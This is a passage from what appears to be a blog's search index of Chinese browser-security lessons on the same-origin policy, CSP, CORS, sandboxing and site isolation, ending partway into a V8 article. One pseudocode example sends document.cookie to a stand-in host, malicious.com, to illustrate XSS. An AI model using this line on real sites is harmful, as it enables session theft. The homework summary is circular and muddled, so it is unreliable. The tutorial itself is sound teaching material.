是同源的。</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">https://time.geekbang.org/?category=1</span><br><span class=\"line\">https://time.geekbang.org/?category=0</span><br></pre></td></tr></tbody></table></figure>\n\n<p>浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，我们把这称为同源策略。</p>\n<p>具体来讲，同源策略主要表现在 DOM、Web 数据和网络这三个层面。</p>\n<p><strong>第一个，DOM 层面</strong>。同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。</p>\n<p>这里我们还是拿极客时间的官网做例子，<strong>打开极客时间的官网</strong>，然后<strong>再从官网中打开另外一个专栏页面</strong>，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663e1cbe0ea9cb1403254292.png\" alt=\"通过极客时间官网打开一个专栏页面\"></p>\n<p>由于第一个页面和第二个页面是同源关系，所以我们可以在第二个页面中操作第一个页面的 DOM，比如将第一个页面全部隐藏掉，代码如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">    <span class=\"keyword\">let</span> pdom = opener.<span class=\"property\">document</span></span><br><span class=\"line\">    pdom.<span class=\"property\">body</span>.<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">\"none\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>该代码中，对象 opener 就是指向第一个页面的 window 对象，我们可以通过操作 opener 来控制第一个页面中的 DOM。</p>\n<p>我们在第二个页面的控制台中执行上面那段代码，就成功地操作了第一个页面中的 DOM，将页面隐藏了，如下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663e1d150ea9cb14032609cb.png\" alt=\"通过第二个页面操纵第一个页面的DOM\"></p>\n<p>不过如果打开的第二个页面和第一个页面不是同源的，那么它们就无法相互操作 DOM 了。比如<strong>从极客时间官网打开 InfoQ 的页面</strong>（由于它们的域名不同，所以不是同源的），然后我们还按照前面同样的步骤来操作，最终操作结果如下图所示</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663e1d4a0ea9cb14032687b9.png\" alt=\"不同源的两个页面不能相互操纵DOM\"></p>\n<p>从图中可以看出，当我们在 InfoQ 的页面中访问极客时间页面中的 DOM 时，页面抛出了如下的异常信息，这就是同源策略所发挥的作用。</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Blocked</span> a frame <span class=\"keyword\">with</span> origin <span class=\"string\">\"https://www.infoq.cn\"</span> <span class=\"keyword\">from</span> accessing a cross-origin frame.</span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>第二个，数据层面</strong>。同源策略限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据。由于同源策略，我们依然无法通过第二个页面的 opener 来访问第一个页面中的 Cookie、IndexDB 或者 LocalStorage 等内容。你可以自己试一下，这里我们就不做演示了。</p>\n<p><strong>第三个，网络层面</strong>。同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。你还记得在《<a href=\"/browser/pageEventLoop/XMLHttpRequest.html\">WebAPI：XMLHttpRequest 是怎么实现的？</a>》这篇文章的末尾分析的 XMLHttpRequest 在使用过程中所遇到的坑吗？其中第一个坑就是在默认情况下不能访问跨域的资源。</p>\n<h2 id=\"安全和便利性的权衡\"><a href=\"#安全和便利性的权衡\" class=\"headerlink\" title=\"安全和便利性的权衡\"></a>安全和便利性的权衡</h2><p>我们了解了同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。</p>\n<p>不过安全性和便利性是相互对立的，让不同的源之间绝对隔离，无疑是最安全的措施，但这也会使得 Web 项目难以开发和使用。因此我们就要在这之间做出权衡，出让一些安全性来满足灵活性；而出让安全性又带来了很多安全问题，最典型的是 XSS 攻击和 CSRF 攻击，这两种攻击我们会在后续两篇文章中再做介绍，本文我们只聊浏览器出让了同源策略的哪些安全性。</p>\n<h3 id=\"1-页面中可以嵌入第三方资源\"><a href=\"#1-页面中可以嵌入第三方资源\" class=\"headerlink\" title=\"1. 页面中可以嵌入第三方资源\"></a>1. 页面中可以嵌入第三方资源</h3><p>我们在文章开头提到过，Web 世界是开放的，可以接入任何资源，而同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 HTML 文件、JavaScript 文件、CSS 文件、图片等资源都部署在同一台服务器上，这无疑违背了 Web 的初衷，也带来了诸多限制。比如将不同的资源部署到不同的 CDN 上时，CDN 上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个 “口子”，让其任意引用外部文件。</p>\n<p>所以最初的浏览器都是支持外部引用资源文件的，不过这也带来了很多问题。之前在开发浏览器的时候，遇到最多的一个问题是浏览器的首页内容会被一些恶意程序劫持，劫持的途径很多，其中最常见的是恶意程序通过各种途径往 HTML 文件中插入恶意脚本。</p>\n<p>比如，恶意程序在 HTML 文件内容中插入如下一段 JavaScript 代码：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663e1e500ea9cb1403290139.png\" alt=\"恶意代码\"></p>\n<p>当这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的连接指向，等等。</p>\n<p>除此之外，它还能将页面的的敏感数据，如 Cookie、IndexDB、LoacalStorage 等数据通过 XSS 的手段发送给服务器。具体来讲就是，当你不小心点击了页面中的一个恶意链接时，恶意 JavaScript 代码可以读取页面数据并将其发送给服务器，如下面这段伪代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">onClick</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">  <span class=\"keyword\">let</span> url = <span class=\"string\">`http://malicious.com?cookie = <span class=\"subst\">${<span class=\"variable language_\">document</span>.cookie}</span>`</span></span><br><span class=\"line\">  <span class=\"title function_\">open</span>(url)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">onClick</span>()</span><br></pre></td></tr></tbody></table></figure>\n\n<p>在这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。</p>\n<p>以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。<strong>CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码</strong>。通过这些手段就可以大大减少 XSS 攻击。</p>\n<h3 id=\"2-跨域资源共享和跨文档消息机制\"><a href=\"#2-跨域资源共享和跨文档消息机制\" class=\"headerlink\" title=\"2. 跨域资源共享和跨文档消息机制\"></a>2. 跨域资源共享和跨文档消息机制</h3><p>默认情况下，如果打开极客邦的官网页面，在官网页面中通过 XMLHttpRequest 或者 Fetch 来请求 InfoQ 中的资源，这时同源策略会阻止其向 InfoQ 发出请求，这样会大大制约我们的生产力。</p>\n<p>为了解决这个问题，我们引入了跨域资源共享（CORS），使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。</p>\n<p>在介绍同源策略时，我们说明了如果两个页面不是同源的，则无法相互操纵 DOM。不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了<strong>跨文档消息机制</strong>，可以通过 <code>window.postMessage</code> 的 JavaScript 接口来和不同源的 DOM 进行通信。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就介绍到这里，下面我来总结下本文的主要内容。</p>\n<p>同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。</p>\n<p>不过鱼和熊掌不可兼得，要绝对的安全就要牺牲掉便利性，因此我们要在这二者之间做权衡，找到中间的一个平衡点，也就是目前的页面安全策略原型。总结起来，它具备以下三个特点：</p>\n<ol>\n<li>页面中可以引用第三方资源，不过这也暴露了很多诸如 XSS 的安全问题，因此又在这种开放的基础之上引入了 CSP 来限制其自由程度。</li>\n<li>使用 XMLHttpRequest 和 Fetch 都是无法直接进行跨域请求的，因此浏览器又在这种严格策略的基础之上引入了跨域资源共享策略，让其可以安全地进行跨域操作。</li>\n<li>两个不同源的 DOM 是不能相互操纵的，因此，浏览器中又实现了跨文档消息机制，让其可以比较安全地通信。</li>\n</ol>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>你来总结一下同源策略、CSP 和 CORS 之间的关系，这对于你理解浏览器的安全策略至关重要。</p>\n<ol>\n<li>同源策略：同源策略是浏览器的安全策略，它限制了不同源的页面之间进行通信，从而实现 Web 页面的安全性。同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。</li>\n<li>CSP：CSP 是浏览器的安全策略，它限制了浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。通过这些手段就可以大大减少 XSS 攻击。</li>\n<li>CORS：CORS 是浏览器的安全策略，它限制了浏览器是否能够进行跨域请求，从而实现 Web 页面的安全性。</li>\n<li>跨文档消息机制：跨文档消息机制是浏览器的安全策略，它通过 <code>window.postMessage</code> 的 JavaScript 接口来和不同源的 DOM 进行通信。</li>\n</ol>\n<p><strong>总结</strong>：同源策略、CSP 和 CORS 之间的关系是：同源策略是 CSP 和 CORS 的基础，CSP 和 CORS 是同源策略的基础，同源策略和 CORS 是跨域安全的基础，跨域安全的基础是同源策略和 CORS。</p>\n"},{"title":"安全沙箱：页面和系统之间的隔离墙","url":"/browser/security/SecuritySandBox.html","content":"<p>前面三篇文章我们主要围绕同源策略介绍了 Web 页面安全的相关内容，那今天我们把视野向外延伸，来聊聊页面安全和操作系统安全之间的关系。</p>\n<p>在最开始的阶段，浏览器是单进程的，这意味着渲染过程、JavaScript 执行过程、网络加载过程、UI 绘制过程和页面显示过程等都是在同一个进程中执行的，这种结构虽然简单，但是也带来了很多问题。</p>\n<p><strong>从稳定性视角来看，单进程架构的浏览器是不稳定的</strong>，因为只要浏览器进程中的任意一个功能出现异常都有可能影响到整个浏览器，如页面卡死、浏览器崩溃等。不过浏览器的稳定性并不是本文讨论的重点，我们今天主要聊的是<strong>浏览器架构是如何影响到操作系统安全的</strong>。</p>\n<p>浏览器本身的漏洞是单进程浏览器的一个主要问题，如果浏览器被曝出存在漏洞，那么在这些漏洞没有被及时修复的情况下，黑客就有可能通过恶意的页面向浏览器中注入恶意程序，其中最常见的攻击方式是利用<strong>缓冲区溢出</strong>，不过需要<strong>注意这种类型的攻击和 XSS 注入的脚本是不一样的</strong>。</p>\n<ul>\n<li>XSS 攻击只是将恶意的 JavaScript 脚本注入到页面中，虽然能窃取一些 Cookie 相关的数据，但是 XSS 无法对操作系统进行攻击。</li>\n<li>而通过浏览器漏洞进行的攻击是可以入侵到浏览器进程内部的，可以读取和修改浏览器进程内部的任意内容，还可以穿透浏览器，在用户的操作系统上悄悄地安装恶意软件、监听用户键盘输入信息以及读取用户硬盘上的文件内容。</li>\n</ul>\n<p>和 XSS 攻击页面相比，这类攻击无疑是枚 “核弹”，它会将整个操作系统的内容都暴露给黑客，这样我们操作系统上所有的资料都是不安全的了。</p>\n<h2 id=\"安全视角下的多进程架构\"><a href=\"#安全视角下的多进程架构\" class=\"headerlink\" title=\"安全视角下的多进程架构\"></a>安全视角下的多进程架构</h2><p>现代浏览器的设计目标是安全、快速和稳定，而这种核弹级杀伤力的安全问题就是一个很大的潜在威胁，因此在设计现代浏览器的体系架构时，需要解决这个问题。</p>\n<p>我们知道现代浏览器采用了多进程架构，将渲染进程和浏览器主进程做了分离。下面我们重点从操作系统安全的视角来看看浏览器的多进程架构，如下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663f75510ea9cb1403657272.png\" alt=\"浏览器内核和渲染进程\"></p>\n<p>观察上图，我们知道浏览器被划分为<strong>浏览器内核</strong>和<strong>渲染内核</strong>两个核心模块，其中浏览器内核是由网络进程、浏览器主进程和 GPU 进程组成的，渲染内核就是渲染进程。那如果我们在浏览器中打开一个页面，这两个模块是怎么配合的呢？</p>\n<p>所有的网络资源都是通过浏览器内核来下载的，下载后的资源会通过 IPC 将其提交给渲染进程（浏览器内核和渲染进程之间都是通过 IPC 来通信的）。然后渲染进程会对这些资源进行解析、绘制等操作，最终生成一幅图片。但是渲染进程并不负责将图片显示到界面上，而是将最终生成的图片提交给浏览器内核模块，由浏览器内核模块负责显示这张图片。</p>\n<p>设计现代浏览器体系架构时，将浏览器划分为不同的进程是为了增加其稳定性。虽然设计成了多进程架构，不过这些模块之间的沟通方式却有些复杂，也许你还有以下问题：</p>\n<ul>\n<li>为什么一定要通过浏览器内核去请求资源，再将数据转发给渲染进程，而不直接从进程内部去请求网络资源？</li>\n<li>为什么渲染进程只负责生成页面图片，生成图片还要经过 IPC 通知浏览器内核模块，然后让浏览器内核去负责展示图片？<br>通过以上方式不是增加了工程的复杂度吗？</li>\n</ul>\n<p>要解释现代浏览器为什么要把这个流程弄得这么复杂，我们就得从系统安全的角度来分析。</p>\n<h2 id=\"安全沙箱\"><a href=\"#安全沙箱\" class=\"headerlink\" title=\"安全沙箱\"></a>安全沙箱</h2><p>不过在解释这些问题之前，我们得先看看什么是安全沙箱。</p>\n<p>上面我们分析过了，由于渲染进程需要执行 DOM 解析、CSS 解析、网络图片解码等操作，如果渲染进程中存在系统级别的漏洞，那么以上操作就有可能让恶意的站点获取到渲染进程的控制权限，进而又获取操作系统的控制权限，这对于用户来说是非常危险的。</p>\n<p>因为网络资源的内容存在着各种可能性，所以浏览器会默认所有的网络资源都是不可信的，都是不安全的。但谁也不能保证浏览器不存在漏洞，只要出现漏洞，黑客就可以通过网络内容对用户发起攻击。</p>\n<p>我们知道，如果你下载了一个恶意程序，但是没有执行它，那么恶意程序是不会生效的。同理，浏览器之于网络内容也是如此，浏览器可以安全地下载各种网络资源，但是如果要执行这些网络资源，比如解析 HTML、解析 CSS、执行 JavaScript、图片编解码等操作，就需要非常谨慎了，因为一不小心，黑客就会利用这些操作对含有漏洞的浏览器发起攻击。</p>\n<p>基于以上原因，我们需要在渲染进程和操作系统之间建一道墙，即便渲染进程由于存在漏洞被黑客攻击，但由于这道墙，黑客就获取不到渲染进程之外的任何操作权限。<strong>将渲染进程和操作系统隔离的这道墙就是我们要聊的安全沙箱</strong>。</p>\n<p>浏览器中的安全沙箱是利用操作系统提供的安全技术，让渲染进程在执行过程中无法访问或者修改操作系统中的数据，在渲染进程需要访问系统资源的时候，需要通过浏览器内核来实现，然后将访问的结果通过 IPC 转发给渲染进程。</p>\n<p>安全沙箱最小的保护单位是进程。因为单进程浏览器需要频繁访问或者修改操作系统的数据，所以单进程浏览器是无法被安全沙箱保护的，而现代浏览器采用的多进程架构使得安全沙箱可以发挥作用。</p>\n<h2 id=\"安全沙箱如何影响各个模块功能\"><a href=\"#安全沙箱如何影响各个模块功能\" class=\"headerlink\" title=\"安全沙箱如何影响各个模块功能\"></a>安全沙箱如何影响各个模块功能</h2><p>我们知道安全沙箱最小的保护单位是进程，并且能限制进程对操作系统资源的访问和修改，这就意味着如果要让安全沙箱应用在某个进程上，那么这个进程必须没有读写操作系统的功能，比如读写本地文件、发起网络请求、调用 GPU 接口等。</p>\n<p>了解了被安全沙箱保护的进程会有一系列的受限操作之后，接下来我们就可以分析<strong>渲染进程和浏览器内核</strong>各自都有哪些职责，如下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663f75ef0ea9cb1403667599.png\" alt=\"浏览器内核和渲染进程各自职责\"></p>\n<p>通过该图，我们可以看到由于渲染进程需要安全沙箱的保护，因此需要把在渲染进程内部涉及到和系统交互的功能都转移到浏览器内核中去实现。</p>\n<p>那安全沙箱是如何影响到各个模块功能的呢？</p>\n<h3 id=\"持久存储\"><a href=\"#持久存储\" class=\"headerlink\" title=\"持久存储\"></a>持久存储</h3><p>我们先来看看安全沙箱是如何影响到浏览器持久存储的。由于安全沙箱需要负责确保渲染进程无法直接访问用户的文件系统，但是在渲染进程内部有访问 Cookie 的需求、有上传文件的需求，为了解决这些文件的访问需求，所以现代浏览器将读写文件的操作全部放在了浏览器内核中实现，然后通过 IPC 将操作结果转发给渲染进程。</p>\n<p>具体地讲，如下文件内容的读写都是在浏览器内核中完成的：</p>\n<ul>\n<li>存储 Cookie 数据的读写。通常浏览器内核会维护一个存放所有 Cookie 的 Cookie 数据库，然后当渲染进程通过 JavaScript 来读取 Cookie 时，渲染进程会通过 IPC 将读取 Cookie 的信息发送给浏览器内核，浏览器内核读取 Cookie 之后再将内容返回给渲染进程。</li>\n<li>一些缓存文件的读写也是由浏览器内核实现的，比如网络文件缓存的读取。</li>\n</ul>\n<h3 id=\"网络访问\"><a href=\"#网络访问\" class=\"headerlink\" title=\"网络访问\"></a>网络访问</h3><p>同样有了安全沙箱的保护，在渲染进程内部也是不能直接访问网络的，如果要访问网络，则需要通过浏览器内核。不过浏览器内核在处理 URL 请求之前，会检查渲染进程是否有权限请求该 URL，比如检查 XMLHttpRequest 或者 Fetch 是否是跨站点请求，或者检测 HTTPS 的站点中是否包含了 HTTP 的请求。</p>\n<h3 id=\"用户交互\"><a href=\"#用户交互\" class=\"headerlink\" title=\"用户交互\"></a>用户交互</h3><p>渲染进程实现了安全沙箱，还影响到了一个非常重要的用户交互功能。</p>\n<p>通常情况下，如果你要实现一个 UI 程序，操作系统会提供一个界面给你，该界面允许应用程序与用户交互，允许应用程序在该界面上进行绘制，比如 Windows 提供的是 HWND，Linux 提供的 X Window，我们就把 HWND 和 X Window 统称为<strong>窗口句柄</strong>。应用程序可以在窗口句柄上进行绘制和接收键盘鼠标消息。</p>\n<p>不过在现代浏览器中，由于每个渲染进程都有安全沙箱的保护，所以在渲染进程内部是无法直接操作窗口句柄的，这也是为了限制渲染进程监控到用户的输入事件。</p>\n<p>由于渲染进程不能直接访问窗口句柄，所以渲染进程需要完成以下两点大的改变。</p>\n<p><strong>第一点</strong>，渲染进程需要渲染出位图。为了向用户显示渲染进程渲染出来的位图，渲染进程需要将生成好的位图发送到浏览器内核，然后浏览器内核将位图复制到屏幕上。</p>\n<p><strong>第二点</strong>，操作系统没有将用户输入事件直接传递给渲染进程，而是将这些事件传递给浏览器内核。然后浏览器内核再根据当前浏览器界面的状态来判断如何调度这些事件，如果当前焦点位于浏览器地址栏中，则输入事件会在浏览器内核内部处理；如果当前焦点在页面的区域内，则浏览器内核会将输入事件转发给渲染进程。</p>\n<p>之所以这样设计，就是为了限制渲染进程有监控到用户输入事件的能力，所以所有的键盘鼠标事件都是由浏览器内核来接收的，然后浏览器内核再通过 IPC 将这些事件发送给渲染进程。</p>\n<p>上面我们分析了由于渲染进程引入了安全沙箱，所以浏览器的持久存储、网络访问和用户交互等功能都不能在渲染进程内直接使用了，因此我们需要把这些功能迁移到浏览器内核中去实现，这让原本比较简单的流程变得复杂了。</p>\n<p>理解这些限制，我们就能解释开始提出的两个问题了。</p>\n<h2 id=\"站点隔离（Site-Isolation）\"><a href=\"#站点隔离（Site-Isolation）\" class=\"headerlink\" title=\"站点隔离（Site Isolation）\"></a>站点隔离（Site Isolation）</h2><p>所谓站点隔离是指 Chrome 将同一站点（包含了相同根域名和相同协议的地址）中相互关联的页面放到同一个渲染进程中执行。</p>\n<p>最开始 Chrome 划分渲染进程是以标签页为单位，也就是说整个标签页会被划分给某个渲染进程。但是，按照标签页划分渲染进程存在一些问题，原因就是一个标签页中可能包含了多个 iframe，而这些 iframe 又有可能来自于不同的站点，这就导致了多个不同站点中的内容通过 iframe 同时运行在同一个渲染进程中。</p>\n<p>目前所有操作系统都面临着两个 A 级漏洞 —— 幽灵（Spectre）和熔毁（Meltdown），这两个漏洞是由处理器架构导致的，很难修补，黑客通过这两个漏洞可以直接入侵到进程的内部，如果入侵的进程没有安全沙箱的保护，那么黑客还可以发起对操作系统的攻击。</p>\n<p>所以如果一个银行站点包含了一个恶意 iframe，然后这个恶意的 iframe 利用这两个 A 级漏洞去入侵渲染进程，那么恶意程序就能读取银行站点渲染进程内的所有内容了，这对于用户来说就存在很大的风险了。</p>\n<p>因此 Chrome 几年前就开始重构代码，将标签级的渲染进程重构为 iframe 级的渲染进程，然后严格按照同一站点的策略来分配渲染进程，这就是 Chrome 中的站点隔离。</p>\n<p>实现了站点隔离，就可以将恶意的 iframe 隔离在恶意进程内部，使得它无法继续访问其他 iframe 进程的内容，因此也就无法攻击其他站点了。</p>\n<p>值得注意是，2019 年 10 月 20 日 Chrome 团队宣布安卓版的 Chrome 已经全面支持站点隔离，你可以参考文中链接。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天的内容就介绍到这里，下面我来总结下本文的主要内容。</p>\n<p>首先我们分析了单进程浏览器在系统安全方面的不足，如果浏览器存在漏洞，那么黑客就有机会通过页面对系统发起攻击。</p>\n<p>因此在设计现代浏览器的体系架构时，就考虑到这个问题了。于是，在多进程的基础之上引入了安全沙箱，有了安全沙箱，就可以将操作系统和渲染进程进行隔离，这样即便渲染进程由于漏洞被攻击，也不会影响到操作系统的。</p>\n<p>由于渲染进程采用了安全沙箱，所以在渲染进程内部不能与操作系统直接交互，于是就在浏览器内核中实现了持久存储、网络访问和用户交互等一系列与操作系统交互的功能，然后通过 IPC 和渲染进程进行交互。</p>\n<p>最后我们还分析了 Chrome 中最新的站点隔离功能。由于最初都是按照标签页来划分渲染进程的，所以如果一个标签页里面有多个不同源的 iframe，那么这些 iframe 也会被分配到同一个渲染进程中，这样就很容易让黑客通过 iframe 来攻击当前渲染进程。而站点隔离会将不同源的 iframe 分配到不同的渲染进程中，这样即使黑客攻击恶意 iframe 的渲染进程，也不会影响到其他渲染进程的。</p>\n<p>今天介绍的内容和概念都比较多，看上去离前端比较远，不过这些内容会影响你对浏览器整体架构的理解，而深入理解了浏览器架构能帮助你更加深刻地理解前端内容。为了方便你的理解，我把一些参考资料放到了文章的最后，有需要的话你可以拿来参考。</p>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>今天留给你的思考题：你认为安全沙箱能防止 XSS 或者 CSRF 一类的攻击的吗？为什么？</p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ol>\n<li><p>安全沙箱的设计参考了<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU2JTlDJTgwJUU1JUIwJThGJUU2JTlEJTgzJUU5JTk5JTkwJUU1JThFJTlGJUU1JTg4JTk5\">最小权限原则<i class=\"fa fa-external-link-alt\"></i></span></p>\n</li>\n<li><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWNsYWIuc3RhbmZvcmQuZWR1L3dlYnNlYy9jaHJvbWl1bS9jaHJvbWl1bS1zZWN1cml0eS1hcmNoaXRlY3R1cmUucGRm\">The Security Architecture of the Chromium Browser<i class=\"fa fa-external-link-alt\"></i></span></p>\n</li>\n<li><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wcmV6aS5jb20vbDN6bHF2ZWVmbG43L3RoZS1zZWN1cml0eS1hcmNoaXRlY3R1cmUtb2YtdGhlLWNocm9taXVtLWJyb3dzZXIv\">The Security Architecture of the Chromium Browser-ppt<i class=\"fa fa-external-link-alt\"></i></span></p>\n</li>\n<li><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY2hyb21pdW0ub3JnL2RldmVsb3BlcnMvZGVzaWduLWRvY3VtZW50cy9zaXRlLWlzb2xhdGlvbi8=\">chromium site-isolation<i class=\"fa fa-external-link-alt\"></i></span></p>\n</li>\n<li><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlzZW5kLmNuL2Jsb2cvZ29vZ2xlLWNocm9tZS1zaXRlLWlzb2xhdGlvbg==\">Site Isolation<i class=\"fa fa-external-link-alt\"></i></span></p>\n</li>\n<li><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMTktcmVpcy5wZGY=\">Site Isolation: Process Separation for Web Sites within the Browser<i class=\"fa fa-external-link-alt\"></i></span></p>\n</li>\n</ol>\n"},{"title":"浏览器的安全策略","url":"/browser/security/index.html","content":"<p><a href=\"/browser/security/SameOriginPolicy.html\">01. 同源策略：为什么 XMLHttpRequest 不能跨域请求资源？</a><br><a href=\"/browser/security/CorssSiteScripting.html\">02. 跨站脚本攻击（XSS）：为什么 Cookie 中有 HttpOnly 属性？</a><br><a href=\"/browser/security/CrossSiteRequestForgery.html\">03. CSRF 攻击：陌生链接不要随便点</a><br><a href=\"/browser/security/SecuritySandbox.html\">04. 安全沙箱：页面和系统之间的隔离墙</a><br><a href=\"/browser/security/HTTPS.html\">05. HTTPS：让数据传输更安全</a><br><a href=\"/browser/security/HTTPSCA.html\">06. HTTPS: 浏览器如何验证 CA 证有效性？</a></p>\n"},{"title":"编译器和解释器：V8 是如何执行一段 JavaScript 代码的？","url":"/browser/v8/CompilerInterpreter.html","content":"<p>前面我们已经花了很多篇幅来介绍 JavaScript 是如何工作的，了解这些内容能帮助你从底层理解 JavaScript 的工作机制，从而能帮助你更好地理解和应用 JavaScript。</p>\n<p>今天这篇文章我们就继续 “向下” 分析，站在 JavaScript 引擎 V8 的视角，来分析 JavaScript 代码是如何被执行的。</p>\n<p>前端工具和框架的自身更新速度非常快，而且还不断有新的出现。要想追赶上前端工具和框架的更新速度，你就需要抓住那些本质的知识，然后才能更加轻松地理解这些上层应用。比如我们接下来要介绍的 V8 执行机制，能帮助你从底层了解 JavaScript，也能帮助你深入理解语言转换器 Babel、语法检查工具 ESLint、前端框架 Vue 和 React 的一些底层实现机制。因此，了解 V8 的编译流程能让你对语言以及相关工具有更加充分的认识。</p>\n<p>要深入理解 V8 的工作原理，你需要搞清楚一些概念和原理，比如接下来我们要详细讲解的<strong>编译器（Compiler）</strong>、<strong>解释器（Interpreter）</strong>、<strong>抽象语法树（AST）</strong>、<strong>字节码（Bytecode）</strong>、<strong>即时编译器（JIT）</strong>等概念，都是你需要重点关注的。</p>\n<h2 id=\"编译器和解释器\"><a href=\"#编译器和解释器\" class=\"headerlink\" title=\"编译器和解释器\"></a>编译器和解释器</h2><p>之所以存在编译器和解释器，是因为机器不能直接理解我们所写的代码，所以在执行程序之前，需要将我们所写的代码 “翻译” 成机器能读懂的机器语言。按语言的执行流程，可以把语言划分为编译型语言和解释型语言。</p>\n<p><strong>编译型语言在程序执行之前，需要经过编译器的编译过程，并且编译之后会直接保留机器能读懂的二进制文件，这样每次运行程序时，都可以直接运行该二进制文件，而不需要再次重新编译了</strong>。比如 C/C++、GO 等都是编译型语言。</p>\n<p><strong>而由解释型语言编写的程序，在每次运行时都需要通过解释器对程序进行动态解释和执行</strong>。比如 Python、JavaScript 等都属于解释型语言。</p>\n<p>那编译器和解释器是如何 “翻译” 代码的呢？具体流程你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663058170ea9cb140383de2e.png\" alt=\"编译器和解释器“翻译”代码\"></p>\n<p>从图中你可以看出这二者的执行流程，大致可阐述为如下：</p>\n<ol>\n<li><p>在编译型语言的编译过程中，编译器首先会依次对源代码进行词法分析、语法分析，生成抽象语法树（AST），然后是优化代码，最后再生成处理器能够理解的机器码。如果编译成功，将会生成一个可执行的文件。但如果编译过程发生了语法或者其他的错误，那么编译器就会抛出异常，最后的二进制文件也不会生成成功。</p>\n</li>\n<li><p>在解释型语言的解释过程中，同样解释器也会对源代码进行词法分析、语法分析，并生成抽象语法树（AST），不过它会再基于抽象语法树生成字节码，最后再根据字节码来执行程序、输出结果。</p>\n</li>\n</ol>\n<h2 id=\"V8是如何执行一段JavaScript代码的\"><a href=\"#V8是如何执行一段JavaScript代码的\" class=\"headerlink\" title=\"V8是如何执行一段JavaScript代码的\"></a>V8 是如何执行一段 JavaScript 代码的</h2><p>通过上面的介绍，相信你已经了解编译器和解释器了。那接下来，我们就重点分析下 V8 是如何执行一段 JavaScript 代码的。你可以先来 “一览全局”，参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6630587f0ea9cb14038486dc.png\" alt=\"V8执行一段代码流程图\"></p>\n<p>从图中可以清楚地看到，V8 在执行过程中既有<strong>解释器 Ignition</strong>，又有<strong>编译器 TurboFan</strong>，那么它们是如何配合去执行一段 JavaScript 代码的呢？下面我们就按照上图来一一分解其执行流程。</p>\n<h3 id=\"1-生成抽象语法树（AST）和执行上下文\"><a href=\"#1-生成抽象语法树（AST）和执行上下文\" class=\"headerlink\" title=\"1. 生成抽象语法树（AST）和执行上下文\"></a>1. 生成抽象语法树（AST）和执行上下文</h3><p>将源代码转换为<strong>抽象语法树</strong>，并生成<strong>执行上下文</strong>，而执行上下文我们在前面的文章中已经介绍过很多了，主要是代码在执行过程中的环境信息。</p>\n<p>那么下面我们就得重点讲解下抽象语法树（下面表述中就直接用它的简称 AST 了），看看什么是 AST 以及 AST 的生成过程是怎样的。</p>\n<p>高级语言是开发者可以理解的语言，但是让编译器或者解释器来理解就非常困难了。对于编译器或者解释器来说，它们可以理解的就是 AST 了。所以无论你使用的是解释型语言还是编译型语言，在编译过程中，它们都会生成一个 AST。这和渲染引擎将 HTML 格式文件转换为计算机可以理解的 DOM 树的情况类似。</p>\n<p>你可以结合下面这段代码来直观地感受下什么是 AST：</p>\n<figure class=\"highlight 